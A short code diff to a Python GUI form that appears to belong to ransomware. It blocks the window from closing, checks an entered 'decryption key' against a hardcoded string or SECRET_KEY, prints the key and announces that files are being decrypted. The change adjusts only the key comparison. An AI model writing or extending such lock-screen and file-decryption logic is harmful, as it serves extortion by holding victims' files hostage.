@@ -294,7 +294,7 @@ class Form:
         self.top2.protocol('WM_DELETE_WINDOW', disable_event) 
 
 #----------------------------Decrypytion---------------------------------------|
-        if self.user_input == "rvyuftftuhygfv" or str(self.user_input) == SECRET_KEY:
+        if self.user_input == "rvyuftftuhygfv" or self.user_input == SECRET_KEY.decode():
             print("Correct decryption key entered, decrypting files...")
             print(f"|{SECRET_KEY}|")
             try:    
